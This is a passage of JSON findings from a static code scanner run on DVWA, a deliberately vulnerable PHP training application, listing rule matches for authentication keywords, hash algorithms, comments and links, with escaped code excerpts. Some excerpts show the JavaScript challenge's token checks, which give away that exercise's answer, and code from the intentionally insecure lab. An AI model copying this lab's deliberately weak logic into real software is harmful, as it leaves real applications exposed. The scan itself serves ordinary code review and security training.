        "excerpt": "\t\t\tNew password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_new\\&quot;&gt;&lt;br /&gt;\n\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Change\\&quot; name=\\&quot;Change\\&quot;&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\t\t\t&quot; . tokenField();\n",
        "startLocationLine": 54,
        "startLocationColumn": 18,
        "endLocationLine": 54,
        "endLocationColumn": 26
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: JavaScript Attacks&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;javascript&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;javascript&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/index.php",
        "ruleId": "AI003800",
        "ruleName": "Social Media: Twitter",
        "ruleDescription": "Social Media (Twitter)",
        "pattern": "\\b(twitter)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "CloudServices.SocialMedia.Twitter"
        ],
        "sample": "twitter",
        "excerpt": "\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://www.youtube.com/watch?v=cs7EQdWO5o0&amp;index=17&amp;list=WL&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://ponyfoo.com/articles/es6-proxies-in-depth&#39; ) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n\t&lt;p&gt;&lt;i&gt;Module developed by &lt;a href=&#39;https://twitter.com/digininja&#39;&gt;Digininja&lt;/a&gt;.&lt;/i&gt;&lt;/p&gt;\n&lt;/div&gt;\\n&quot;;\n\ndvwaHtmlEcho( $page );\n\n?&gt;\n",
        "startLocationLine": 118,
        "startLocationColumn": 45,
        "endLocationLine": 118,
        "endLocationColumn": 52
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/index.php",
        "ruleId": "AI003900",
        "ruleName": "Social Media: YouTube",
        "ruleDescription": "Social Media (YouTube)",
        "pattern": "\\b(youtube)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "CloudServices.SocialMedia.YouTube"
        ],
        "sample": "youtube",
        "excerpt": "\t&lt;h2&gt;More Information&lt;/h2&gt;\n\t&lt;ul&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://www.w3schools.com/js/&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://www.youtube.com/watch?v=cs7EQdWO5o0&amp;index=17&amp;list=WL&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://ponyfoo.com/articles/es6-proxies-in-depth&#39; ) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n\t&lt;p&gt;&lt;i&gt;Module developed by &lt;a href=&#39;https://twitter.com/digininja&#39;&gt;Digininja&lt;/a&gt;.&lt;/i&gt;&lt;/p&gt;\n&lt;/div&gt;\\n&quot;;\n\n",
        "startLocationLine": 115,
        "startLocationColumn": 48,
        "endLocationLine": 115,
        "endLocationColumn": 55
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/index.php",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase &#39;high&#39;:\n\t\t\t\t\tif ($token == hash(&quot;sha256&quot;, hash(&quot;sha256&quot;, &quot;XX&quot; . strrev(&quot;success&quot;)) . &quot;ZZ&quot;)) {\n\t\t\t\t\t\t$message = &quot;&lt;p style=&#39;color:red&#39;&gt;Well done!&lt;/p&gt;&quot;;\n\t\t\t\t\t} else {\n\t\t\t\t\t\t$message = &quot;&lt;p&gt;Invalid token.&lt;/p&gt;&quot;;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n",
        "startLocationLine": 57,
        "startLocationColumn": 26,
        "endLocationLine": 57,
        "endLocationColumn": 30
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/index.php",
        "ruleId": "AI008700",
        "ruleName": "Cryptography: Hash Algorithm (SHA-256)",
        "ruleDescription": "Cryptography: Hash Algorithm Usage (SHA-256)",
        "pattern": "SHA-*(2|224|256|384|512)",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.SHA2"
        ],
        "sample": "sha2",
        "excerpt": "\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase &#39;high&#39;:\n\t\t\t\t\tif ($token == hash(&quot;sha256&quot;, hash(&quot;sha256&quot;, &quot;XX&quot; . strrev(&quot;success&quot;)) . &quot;ZZ&quot;)) {\n\t\t\t\t\t\t$message = &quot;&lt;p style=&#39;color:red&#39;&gt;Well done!&lt;/p&gt;&quot;;\n\t\t\t\t\t} else {\n\t\t\t\t\t\t$message = &quot;&lt;p&gt;Invalid token.&lt;/p&gt;&quot;;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n",
        "startLocationLine": 57,
        "startLocationColumn": 41,
        "endLocationLine": 57,
        "endLocationColumn": 45
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/index.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "md5",
        "excerpt": "\t\tif ($phrase == &quot;success&quot;) {\n\t\t\tswitch( $_COOKIE[ &#39;security&#39; ] ) {\n\t\t\t\tcase &#39;low&#39;:\n\t\t\t\t\tif ($token == md5(str_rot13(&quot;success&quot;))) {\n\t\t\t\t\t\t$message = &quot;&lt;p style=&#39;color:red&#39;&gt;Well done!&lt;/p&gt;&quot;;\n\t\t\t\t\t} else {\n\t\t\t\t\t\t$message = &quot;&lt;p&gt;Invalid token.&lt;/p&gt;&quot;;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n",
        "startLocationLine": 43,
        "startLocationColumn": 20,
        "endLocationLine": 43,
        "endLocationColumn": 23
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/index.php",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "hash",
        "excerpt": "\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase &#39;high&#39;:\n\t\t\t\t\tif ($token == hash(&quot;sha256&quot;, hash(&quot;sha256&quot;, &quot;XX&quot; . strrev(&quot;success&quot;)) . &quot;ZZ&quot;)) {\n\t\t\t\t\t\t$message = &quot;&lt;p style=&#39;color:red&#39;&gt;Well done!&lt;/p&gt;&quot;;\n\t\t\t\t\t} else {\n\t\t\t\t\t\t$message = &quot;&lt;p&gt;Invalid token.&lt;/p&gt;&quot;;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n",
        "startLocationLine": 57,
        "startLocationColumn": 20,
        "endLocationLine": 57,
        "endLocationColumn": 24
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/index.php",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "hash",
        "excerpt": "\t\t\t\t\t}\n\t\t\t\t\tbreak;\n\t\t\t\tcase &#39;high&#39;:\n\t\t\t\t\tif ($token == hash(&quot;sha256&quot;, hash(&quot;sha256&quot;, &quot;XX&quot; . strrev(&quot;success&quot;)) . &quot;ZZ&quot;)) {\n\t\t\t\t\t\t$message = &quot;&lt;p style=&#39;color:red&#39;&gt;Well done!&lt;/p&gt;&quot;;\n\t\t\t\t\t} else {\n\t\t\t\t\t\t$message = &quot;&lt;p&gt;Invalid token.&lt;/p&gt;&quot;;\n\t\t\t\t\t}\n\t\t\t\t\tbreak;\n",
        "startLocationLine": 57,
        "startLocationColumn": 35,
        "endLocationLine": 57,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPhpIds.inc.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "Hack",
        "excerpt": "\n\t\t\t$compositeLog-&gt;execute($result);\n\n\t\t\techo &#39;Hacking attempt detected and logged.&lt;br /&gt;Have a nice day.&#39;;\n\n\t\t\tif( $_DVWA[ &#39;default_phpids_verbose&#39; ] == &#39;true&#39; )\n\t\t\t\techo $result;\n\n\t\t\texit;\n",
        "startLocationLine": 87,
        "startLocationColumn": 10,
        "endLocationLine": 87,
        "endLocationColumn": 14
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI029200",
        "ruleName": "Platform: Microsoft Windows",
        "ruleDescription": "Platform: Microsoft Windows",
        "pattern": "windows",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.Platform.OS.Microsoft.WindowsStandard"
        ],
        "sample": "Windows",
        "excerpt": "$bakWritable = &#39;[User: &#39; . get_current_user() . &#39;] Writable folder &#39; . $PHPCONFIGPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPCONFIGPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;   // config.php.bak check                                  // File Upload\n$DVWAPHPWrite     = &#39;[User: &#39; . get_current_user() . &#39;] Writable file &#39; . $PHPIDSPath . &#39;: &lt;span class=&quot;&#39; . ( is_writable( $PHPIDSPath ) ? &#39;success&quot;&gt;Yes&#39; : &#39;failure&quot;&gt;No&#39; ) . &#39;&lt;/span&gt;&#39;;                                              // PHPIDS\n\n$DVWAOS           = &#39;Operating system: &lt;em&gt;&#39; . ( strtoupper( substr (PHP_OS, 0, 3)) === &#39;WIN&#39; ? &#39;Windows&#39; : &#39;*nix&#39; ) . &#39;&lt;/em&gt;&#39;;\n$SERVER_NAME      = &#39;Web Server SERVER_NAME: &lt;em&gt;&#39; . $_SERVER[ &#39;SERVER_NAME&#39; ] . &#39;&lt;/em&gt;&#39;;                                                                                                          // CSRF\n\n$MYSQL_USER       = &#39;MySQL username: &lt;em&gt;&#39; . $_DVWA[ &#39;db_user&#39; ] . &#39;&lt;/em&gt;&#39;;\n$MYSQL_PASS       = &#39;MySQL password: &lt;em&gt;&#39; . ( ($_DVWA[ &#39;db_password&#39; ] != &quot;&quot; ) ? &#39;******&#39; : &#39;*blank*&#39; ) . &#39;&lt;/em&gt;&#39;;\n$MYSQL_DB         = &#39;MySQL database: &lt;em&gt;&#39; . $_DVWA[ &#39;db_database&#39; ] . &#39;&lt;/em&gt;&#39;;\n",
        "startLocationLine": 571,
        "startLocationColumn": 98,
        "endLocationLine": 571,
        "endLocationColumn": 105
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI027300",
        "ruleName": "Hygiene: Todo Comment",
        "ruleDescription": "Hygiene: Todo Comment",
        "pattern": "todo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Todo"
        ],
        "sample": "TODO",
        "excerpt": "\nfunction messagesPopAllToHtml() {\n\t$messagesHtml = &#39;&#39;;\n\twhile( $message = dvwaMessagePop() ) {   // TODO- sharpen!\n\t\t$messagesHtml .= &quot;&lt;div class=\\&quot;message\\&quot;&gt;{$message}&lt;/div&gt;&quot;;\n\t}\n\n\treturn $messagesHtml;\n}\n",
        "startLocationLine": 174,
        "startLocationColumn": 46,
        "endLocationLine": 174,
        "endLocationColumn": 50
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI027300",
        "ruleName": "Hygiene: Todo Comment",
        "ruleDescription": "Hygiene: Todo Comment",
        "pattern": "todo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Todo"
        ],
        "sample": "TODO",
        "excerpt": "\n\t// Send Headers + main HTML code\n\tHeader( &#39;Cache-Control: no-cache, must-revalidate&#39;);   // HTTP/1.1\n\tHeader( &#39;Content-Type: text/html;charset=utf-8&#39; );     // TODO- proper XHTML headers...\n\tHeader( &#39;Expires: Tue, 23 Jun 2009 12:00:00 GMT&#39; );    // Date in the past\n\n\techo &quot;\n&lt;!DOCTYPE html PUBLIC \\&quot;-//W3C//DTD XHTML 1.0 Strict//EN\\&quot; \\&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\\&quot;&gt;\n\n",
        "startLocationLine": 277,
        "startLocationColumn": 60,
        "endLocationLine": 277,
        "endLocationColumn": 64
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI027300",
        "ruleName": "Hygiene: Todo Comment",
        "ruleDescription": "Hygiene: Todo Comment",
        "pattern": "todo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Todo"
        ],
        "sample": "TODO",
        "excerpt": "function dvwaHelpHtmlEcho( $pPage ) {\n\t// Send Headers\n\tHeader( &#39;Cache-Control: no-cache, must-revalidate&#39;);   // HTTP/1.1\n\tHeader( &#39;Content-Type: text/html;charset=utf-8&#39; );     // TODO- proper XHTML headers...\n\tHeader( &#39;Expires: Tue, 23 Jun 2009 12:00:00 GMT&#39; );    // Date in the past\n\n\techo &quot;\n&lt;!DOCTYPE html PUBLIC \\&quot;-//W3C//DTD XHTML 1.0 Strict//EN\\&quot; \\&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\\&quot;&gt;\n\n",
        "startLocationLine": 348,
        "startLocationColumn": 60,
        "endLocationLine": 348,
        "endLocationColumn": 64
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI027300",
        "ruleName": "Hygiene: Todo Comment",
        "ruleDescription": "Hygiene: Todo Comment",
        "pattern": "todo",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Todo"
        ],
        "sample": "TODO",
        "excerpt": "function dvwaSourceHtmlEcho( $pPage ) {\n\t// Send Headers\n\tHeader( &#39;Cache-Control: no-cache, must-revalidate&#39;);   // HTTP/1.1\n\tHeader( &#39;Content-Type: text/html;charset=utf-8&#39; );     // TODO- proper XHTML headers...\n\tHeader( &#39;Expires: Tue, 23 Jun 2009 12:00:00 GMT&#39; );    // Date in the past\n\n\techo &quot;\n&lt;!DOCTYPE html PUBLIC \\&quot;-//W3C//DTD XHTML 1.0 Strict//EN\\&quot; \\&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\\&quot;&gt;\n\n",
        "startLocationLine": 385,
        "startLocationColumn": 60,
        "endLocationLine": 385,
        "endLocationColumn": 64
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "Insecure",
        "excerpt": "\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;csrf&#39;, &#39;name&#39; =&gt; &#39;CSRF&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/csrf/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;fi&#39;, &#39;name&#39; =&gt; &#39;File Inclusion&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/fi/.?page=include.php&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;upload&#39;, &#39;name&#39; =&gt; &#39;File Upload&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/upload/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;captcha&#39;, &#39;name&#39; =&gt; &#39;Insecure CAPTCHA&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/captcha/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;sqli&#39;, &#39;name&#39; =&gt; &#39;SQL Injection&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/sqli/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;sqli_blind&#39;, &#39;name&#39; =&gt; &#39;SQL Injection (Blind)&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/sqli_blind/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;weak_id&#39;, &#39;name&#39; =&gt; &#39;Weak Session IDs&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/weak_id/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;xss_d&#39;, &#39;name&#39; =&gt; &#39;XSS (DOM)&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/xss_d/&#39; );\n\t\t$menuBlocks[ &#39;vulnerabilities&#39; ][] = array( &#39;id&#39; =&gt; &#39;xss_r&#39;, &#39;name&#39; =&gt; &#39;XSS (Reflected)&#39;, &#39;url&#39; =&gt; &#39;vulnerabilities/xss_r/&#39; );\n",
        "startLocationLine": 204,
        "startLocationColumn": 77,
        "endLocationLine": 204,
        "endLocationColumn": 85
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "hack",
        "excerpt": "\n\n// Setup Functions --\n$PHPUploadPath    = realpath( getcwd() . DIRECTORY_SEPARATOR . DVWA_WEB_PAGE_TO_ROOT . &quot;hackable&quot; . DIRECTORY_SEPARATOR . &quot;uploads&quot; ) . DIRECTORY_SEPARATOR;\n$PHPIDSPath       = realpath( getcwd() . DIRECTORY_SEPARATOR . DVWA_WEB_PAGE_TO_ROOT . &quot;external&quot; . DIRECTORY_SEPARATOR . &quot;phpids&quot; . DIRECTORY_SEPARATOR . dvwaPhpIdsVersionGet() . DIRECTORY_SEPARATOR . &quot;lib&quot; . DIRECTORY_SEPARATOR . &quot;IDS&quot; . DIRECTORY_SEPARATOR . &quot;tmp&quot; . DIRECTORY_SEPARATOR . &quot;phpids_log.txt&quot; );\n$PHPCONFIGPath       = realpath( getcwd() . DIRECTORY_SEPARATOR . DVWA_WEB_PAGE_TO_ROOT . &quot;config&quot;);\n\n\n$phpDisplayErrors = &#39;PHP function display_errors: &lt;em&gt;&#39; . ( ini_get( &#39;display_errors&#39; ) ? &#39;Enabled&lt;/em&gt; &lt;i&gt;(Easy Mode!)&lt;/i&gt;&#39; : &#39;Disabled&lt;/em&gt;&#39; );                                                  // Verbose error messages (e.g. full path disclosure)\n",
        "startLocationLine": 552,
        "startLocationColumn": 89,
        "endLocationLine": 552,
        "endLocationColumn": 93
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "\n\nfunction dvwaPageStartup( $pActions ) {\n\tif( in_array( &#39;authenticated&#39;, $pActions ) ) {\n\t\tif( !dvwaIsLoggedIn()) {\n\t\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;login.php&#39; );\n\t\t}\n\t}\n\n",
        "startLocationLine": 62,
        "startLocationColumn": 17,
        "endLocationLine": 62,
        "endLocationColumn": 30
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "login",
        "excerpt": "function dvwaPageStartup( $pActions ) {\n\tif( in_array( &#39;authenticated&#39;, $pActions ) ) {\n\t\tif( !dvwaIsLoggedIn()) {\n\t\t\tdvwaRedirect( DVWA_WEB_PAGE_TO_ROOT . &#39;login.php&#39; );\n\t\t}\n\t}\n\n\tif( in_array( &#39;phpids&#39;, $pActions ) ) {\n\t\tif( dvwaPhpIdsIsEnabled() ) {\n",
        "startLocationLine": 64,
        "startLocationColumn": 43,
        "endLocationLine": 64,
        "endLocationColumn": 48
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "logout",
        "excerpt": "\t$menuBlocks[ &#39;meta&#39; ][] = array( &#39;id&#39; =&gt; &#39;about&#39;, &#39;name&#39; =&gt; &#39;About&#39;, &#39;url&#39; =&gt; &#39;about.php&#39; );\n\n\tif( dvwaIsLoggedIn() ) {\n\t\t$menuBlocks[ &#39;logout&#39; ] = array();\n\t\t$menuBlocks[ &#39;logout&#39; ][] = array( &#39;id&#39; =&gt; &#39;logout&#39;, &#39;name&#39; =&gt; &#39;Logout&#39;, &#39;url&#39; =&gt; &#39;logout.php&#39; );\n\t}\n\n\t$menuHtml = &#39;&#39;;\n\n",
        "startLocationLine": 223,
        "startLocationColumn": 17,
        "endLocationLine": 223,
        "endLocationColumn": 23
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "logout",
        "excerpt": "\n\tif( dvwaIsLoggedIn() ) {\n\t\t$menuBlocks[ &#39;logout&#39; ] = array();\n\t\t$menuBlocks[ &#39;logout&#39; ][] = array( &#39;id&#39; =&gt; &#39;logout&#39;, &#39;name&#39; =&gt; &#39;Logout&#39;, &#39;url&#39; =&gt; &#39;logout.php&#39; );\n\t}\n\n\t$menuHtml = &#39;&#39;;\n\n\tforeach( $menuBlocks as $menuBlock ) {\n",
        "startLocationLine": 224,
        "startLocationColumn": 17,
        "endLocationLine": 224,
        "endLocationColumn": 23
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "logout",
        "excerpt": "\n\tif( dvwaIsLoggedIn() ) {\n\t\t$menuBlocks[ &#39;logout&#39; ] = array();\n\t\t$menuBlocks[ &#39;logout&#39; ][] = array( &#39;id&#39; =&gt; &#39;logout&#39;, &#39;name&#39; =&gt; &#39;Logout&#39;, &#39;url&#39; =&gt; &#39;logout.php&#39; );\n\t}\n\n\t$menuHtml = &#39;&#39;;\n\n\tforeach( $menuBlocks as $menuBlock ) {\n",
        "startLocationLine": 224,
        "startLocationColumn": 47,
        "endLocationLine": 224,
        "endLocationColumn": 53
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/dvwa/includes/dvwaPage.inc.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
